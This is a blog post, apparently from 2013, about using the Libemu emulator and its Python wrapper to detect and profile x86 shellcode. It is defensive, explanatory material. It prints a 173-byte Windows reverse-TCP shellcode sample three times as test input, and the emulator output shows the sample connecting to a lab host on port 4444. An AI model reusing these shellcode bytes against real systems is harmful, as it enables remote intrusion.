@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>7h3rAm's Infosec Ramblings</title>
+    <meta charset="utf-8"/>
+    <meta content="7h3rAm" name="author"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <script src="/static/js/jquery/jquery-1.10.2.js"></script>
+    <link href="/static/css/bootstrap/bootstrap.3.3.6.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/morrisjs/morris.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/timeline/timeline.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/main.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
+    <link href="/static/images/favicon.ico" rel="icon" type="image/x-icon"/>
+
+    <!-- Google Analytics -->
+    <script>
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-50288765-1', '7h3rAm.github.io');
+    ga('send', 'pageview');
+    </script>
+    <script async src='http://www.google-analytics.com/analytics.js'></script>
+    <!-- End Google Analytics -->
+
+  </head>
+  <body id="index" class="home">
+    <header class="header">
+      <nav>
+        <ul>
+          <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+          <li><a href="/archive.html"><i class="fa fa-archive"></i> Archive</a></li>
+          <li><a href="/tags.html"><i class="fa fa-tags"></i> Tags</a></li>
+          <li><a href="/dashboard.html"><i class="fa fa-bar-chart"></i> Dashboard</a></li>
+          <li><a href="/research.html"><i class="fa fa-list-alt"></i> Research</a></li>
+        </ul>
+      </nav>
+    </header>
+    <section id="content" class="body">
+      
+  
+  
+  <article class="post">
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          x86 Emulation and Shellcode Detection
+        </div>
+        <div class="panel-body">
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              
+                <p class="post-date">
+                  <a href="/2013/geras-wuos-stack5-solutions.html"><i class="fa fa-angle-double-left"></i></a> published on March 6, 2013<a href="/2013/libnids-pynids.html"> <i class="fa fa-angle-double-right"></i></a><br/>
+                  readtime: 9 minutes and 4 seconds (view <a href="https://raw.githubusercontent.io/7h3rAm/7h3rAm.github.io/master/_posts/libemu-shellcode-detection.md">source</a>)
+                </p>
+              
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+        <div class="post-summary">Libemu is a C library for x86 emulation and shellcode detection. Pylibemu is its Python wrapper that provides an easy-to-use API and has additional features compared to the default bindings.</div>
+        <div class="post-content">
+          <p><a href="http://libemu.carnivore.it/">Libemu</a> is a C library that provides x86
+architecture emulation and
+<a href="http://www.infosecwriters.com/hhworld/shellcode.txt">shellcode</a>
+detection features. It uses
+<a href="http://skypher.com/wiki/index.php?title=Hacking/Shellcode/GetPC">GetPC</a>
+heuristics to identify shellcode blobs within an input buffer.</p>
+
+<blockquote>
+  <p><code>GetPC</code> is a shellcode writing technique, commonly used with
+  <a href="http://www.blackhatlibrary.net/Shellcode/Self-modifying">selfmodifying</a>
+  shellcode. Self-modification is a technique that enables a piece code
+  to mutate itself, primarily to hide from AV/HIPS filters. A shellcode
+  won&#8217;t be loaded by a trusted loading mechanism, but would rather be
+  injected into a target process&#8217;s virtual address space. As such,
+  during execution, it will have very limited knowledge of its execution
+  context. Specifically, it won&#8217;t be loaded at a known location and a
+  reliable guess of its base location is unfeasible. Due to this
+  limitation, one cannot use hardcoded <code>jmp</code>/<code>call</code> addresses in a
+  shellcode but rather rely on some code to get the base address and
+  then use offsets from the current base to reach specific locations
+  inside shellcode buffer. Such a piece of code is also referred to as
+  being <a href="http://en.wikipedia.org/wiki/Position-independent_code">Position
+  Independent</a>.</p>
+</blockquote>
+
+<p>Installation instructions are very well documented and a quick search
+would provide you good references, like
+<a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/">this</a>
+for example. Once both Libemu and it&#8217;s Python binding,
+<a href="https://github.com/buffer/pylibemu">pylibemu</a>, are installed we can
+have a quick validation test:</p>
+
+<div class="codehilite"><pre><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">pylibemu</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+  <span class="n">buf</span> <span class="o">+=</span> <span class="n">line</span>
+
+<span class="k">print</span> <span class="s">&quot;[+] Testing buf of fize </span><span class="si">%d</span><span class="s">B ...&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+
+<span class="n">emu</span> <span class="o">=</span> <span class="n">pylibemu</span><span class="o">.</span><span class="n">Emulator</span><span class="p">()</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">emu</span><span class="o">.</span><span class="n">shellcode_getpc_test</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">offset</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
+  <span class="k">print</span> <span class="s">&quot;[+] IS SHELLCODE!&quot;</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="k">print</span> <span class="s">&quot;[-] NOT SHELLCODE!&quot;</span>
+</code></pre></div>
+
+<p>Above program creates an <code>Emulator</code> instance and uses it to perform
+<code>GetPC</code> test upon input buffer. It can read raw input from stdin which
+in our case will be pipe&#8217;d through an <code>echo</code> command as such:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span><span class="nb">echo</span> -en <span class="s2">&quot;\xff\xff\xff\xff&quot;</span> <span class="p">|</span> python emutest.py
+<span class="o">[</span>+<span class="o">]</span> Testing buf of fize 4B ...
+<span class="o">[</span>-<span class="o">]</span> NOT SHELLCODE!
+<span class="err">$</span>
+<span class="nv">$ </span><span class="nb">echo</span> -en <span class="s2">&quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot;</span> <span class="p">|</span> python emutest.py
+<span class="o">[</span>+<span class="o">]</span> Testing buf of fize 173B ...
+<span class="o">[</span>+<span class="o">]</span> IS SHELLCODE!
+</code></pre></div>
+
+<p>As is evident, the sample buffer that was used in a pylibemu usage
+example is indeed identified as shellcode through the <code>GetPC</code> test.
+Pylibemu provides another very useful API method, <code>test()</code>, that can
+profile shellcode bytes and identify Windows system calls, their
+parameters, return values, etc. This helps in understanding the behavior
+of identified shellcode:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span><span class="nb">echo</span> -en <span class="s2">&quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot;</span> <span class="p">|</span> python emuprofile.py
+<span class="o">[</span>+<span class="o">]</span> Testing buf of fize 173B ...
+<span class="o">[</span>+<span class="o">]</span> IS SHELLCODE!
+HMODULE LoadLibraryA <span class="o">(</span>
+  <span class="nv">LPCTSTR</span> <span class="o">=</span> <span class="nv">0x02288910</span> <span class="o">=</span>&gt;
+    <span class="o">=</span> <span class="s2">&quot;ws2_32&quot;</span><span class="p">;</span>
+<span class="o">)</span> <span class="o">=</span>  0x71a10000<span class="p">;</span>
+int WSAStartup <span class="o">(</span>
+  WORD <span class="nv">wVersionRequested</span> <span class="o">=</span> 2<span class="p">;</span>
+  LPWSADATA <span class="nv">lpWSAData</span> <span class="o">=</span> 1244272<span class="p">;</span>
+<span class="o">)</span> <span class="o">=</span>  0x0<span class="p">;</span>
+SOCKET WSASocket <span class="o">(</span>
+  int <span class="nv">af</span> <span class="o">=</span> 2<span class="p">;</span>
+  int <span class="nb">type</span> <span class="o">=</span> 1<span class="p">;</span>
+  int <span class="nv">protocol</span> <span class="o">=</span> 0<span class="p">;</span>
+  LPWSAPROTOCOL_INFO <span class="nv">lpProtocolInfo</span> <span class="o">=</span> 0<span class="p">;</span>
+  GROUP <span class="nv">g</span> <span class="o">=</span> 0<span class="p">;</span>
+  DWORD <span class="nv">dwFlags</span> <span class="o">=</span> 0<span class="p">;</span>
+<span class="o">)</span> <span class="o">=</span>  0x42<span class="p">;</span>
+int connect <span class="o">(</span>
+  SOCKET <span class="nv">s</span> <span class="o">=</span> 66<span class="p">;</span>
+  struct sockaddr_in * <span class="nv">name</span> <span class="o">=</span> <span class="nv">0x0012fe88</span> <span class="o">=</span>&gt;
+    <span class="nv">struct</span> <span class="o">=</span> <span class="o">{</span>
+      short <span class="nv">sin_family</span> <span class="o">=</span> 2<span class="p">;</span>
+      unsigned short <span class="nv">sin_port</span> <span class="o">=</span> <span class="m">23569</span> <span class="o">(</span><span class="nv">port</span><span class="o">=</span>4444<span class="o">)</span><span class="p">;</span>
+      struct in_addr <span class="nv">sin_addr</span> <span class="o">=</span> <span class="o">{</span>
+        unsigned long <span class="nv">s_addr</span> <span class="o">=</span> <span class="m">339060928</span> <span class="o">(</span><span class="nv">host</span><span class="o">=</span>192.168.53.20<span class="o">)</span><span class="p">;</span>
+      <span class="o">}</span><span class="p">;</span>
+      char <span class="nv">sin_zero</span> <span class="o">=</span> <span class="s2">&quot;       &quot;</span><span class="p">;</span>
+    <span class="o">}</span><span class="p">;</span>
+  int <span class="nv">namelen</span> <span class="o">=</span> 16<span class="p">;</span>
+<span class="o">)</span> <span class="o">=</span>  0x0<span class="p">;</span>
+</code></pre></div>
+
+<p>The profiling API identifies critical windows API calls above and
+emulates them in its x86 emulator. The return values for all system
+calls are recorded and dumped when requested. From the output it is
+evident that the shellcode under test will load the win32 socket library
+and then invoke socket calls to connect to host 192.168.53.20 through
+TCP/4444 port. This implies that we are dealing with Windows/x86 Reverse
+TCP Bind shellcode.</p>
+
+<p>Libemu allows you to test arbitrary blob of bytes and test if it depicts
+shellcode-like behavior. Projects like
+<a href="http://code.google.com/p/peepdf/">peepdf</a>,
+<a href="https://code.google.com/p/pyew/">pyew</a>, and
+<a href="https://code.google.com/p/pyew/">Malzilla</a> use Libemu for identifying,
+profiling and analyzing shellcode within arbitrary binary streams.
+Identifying shellcode in network streams is another interesting usecase
+and there is an
+<a href="https://github.com/MITRECND/chopshop/blob/master/modules/shellcode_detector.py">example</a>
+for you to play around.</p>
+
+<p>Libemu includes an interesting program, <code>sctest</code>, that can perform
+testing/profiling over arbitrary files. It can also generate a
+<a href="http://en.wikipedia.org/wiki/Control_flow_graph">CFG</a> for detected
+shellcode and write it to a
+<a href="http://en.wikipedia.org/wiki/DOT_%28graph_description_language%29">DOT</a>
+file which can then be rendered as an image:</p>
+
+<div class="codehilite"><pre><code><span class="nv">$ </span><span class="nb">echo</span> -en <span class="s2">&quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot;</span> &gt;shellcode.bin
+<span class="err">$</span>
+<span class="nv">$ </span>sctest -Sgs <span class="m">1000000</span> -v -G test.dot &lt;shellcode.bin
+<span class="err">$</span>
+<span class="nv">$ </span>dot shellcode.dot -Tpng -o shellcode.png
+</code></pre></div>
+
+<p>Here is the generated CFG image:</p>
+
+<p><img src="/static/files/shellcode.png" alt="image" /></p>
+
+        </div>
+        <div class="post-bottomline">
+          <hr/>
+          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-twitter"></i></a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank"><i class="fa fa-exclamation-circle"></i> issue</a> on blog reporsitory.</p>
+          <hr/>
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              <table>
+                <tr>
+                  <td align="left">(share via <a href="mailto:?subject=x86 Emulation and Shellcode Detection&body=/2013/libemu-shellcode-detection.html" target="_blank" title="Share via Email"><i class="fa fa-inbox"></i></a> <a href="http://twitter.com/intent/tweet?text=x86 Emulation and Shellcode Detection+/2013/libemu-shellcode-detection.html&via=7h3rAm" target="_blank" title="Share on Twitter"><i class="fa fa-twitter"></i></a> <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=/2013/libemu-shellcode-detection.html&p[images][0]=&p[title]=x86 Emulation and Shellcode Detection&p[summary]=Libemu is a C library for x86 emulation and shellcode detection. Pylibemu is its Python wrapper that provides an easy-to-use API and has additional features compared to the default bindings." target="_blank" title="Share on Facebook"><i class="fa fa-facebook"></i></a> <a href="https://plus.google.com/share?url=/2013/libemu-shellcode-detection.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus"></i></a>)</td>
+                  <td align="right">(tagged <a href=/tags.html#code>code</a> and <a href=/tags.html#shellcode>shellcode</a>)</td>
+                </tr>
+                <tr>
+                  
+                    <td align="left"><a href="/2013/geras-wuos-stack5-solutions.html"><i class="fa fa-angle-double-left"></i> Gera's Warming Up on Stack #5 - Solutions <i class="fa fa-angle-double-left"></i></a></td>
+                    <td align="right"><a href="/2013/libnids-pynids.html"><i class="fa fa-angle-double-right"></i> Network Stream Reassembly and Defragmentation <i class="fa fa-angle-double-right"></i></a></td>
+                  
+                </tr>
+              </table>
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          Related Posts
+        </div>
+        <div class="panel-body">
+          
+            1. <a href="/2016/circllu.html">circllu.py: Querying circl.lu API for CVE Information</a>
+            <div class="overview-date">March 12, 2016</div>
+            <br/>
+          
+            2. <a href="/2015/ebctf-bin100.html">Eindbazen CTF Challenge: bin100</a>
+            <div class="overview-date">May 27, 2015</div>
+            <br/>
+          
+            3. <a href="/2014/pcapedit.html">pcapedit: An Interactive Scapy-based Pcap Editor</a>
+            <div class="overview-date">November 15, 2014</div>
+            <br/>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </article>
+
+    </section>
+    <footer class="footer">
+      <b><a href="/">Ankur Tyagi</a></b> (<b><a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-at"></i>7h3rAm</a></b>)
+      <br/>
+      Last updated on October 20, 2016 (<b><a href="/rss.xml"><i class="fa fa-rss"></i> rss</a></b> <b><a href="/sitemap.xml"><i class="fa fa-sitemap"></i> sitemap</a></b>)
+      <br/>
+      Published under <b><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">by-nc-sa</a></b> and powered by <b><a alt="Linux" href="https://www.kernel.org/" target="_blank"><i class="fa fa-linux"></i></a></b>, <b><a alt="Kalpi" href="https://github.com/7h3rAm/kalpi/" target="_blank">kalpi</a></b>, <b><a href="http://git-scm.com/" target="_blank"><i class="fa fa-git"></i></a></b> and <b><a href="https://github.com/7h3rAm/7h3ram.github.io" target="_blank"><i class="fa fa-github"></i></a></b>
+    </footer>
+
+    <script src="/static/js/bootstrap/bootstrap.3.3.6.min.js"></script>
+    <script src="/static/js/raphael/raphael-min.js"></script>
+    <script src="/static/js/morrisjs/morris.min.js"></script>
+    <script src="/static/files/chart-data.js"></script>
+    <script src="/static/js/sprintf/sprintf.js"></script>
+    <script src="/static/js/underscore/underscore-min.js"></script>
+
+  </body>
+</html>
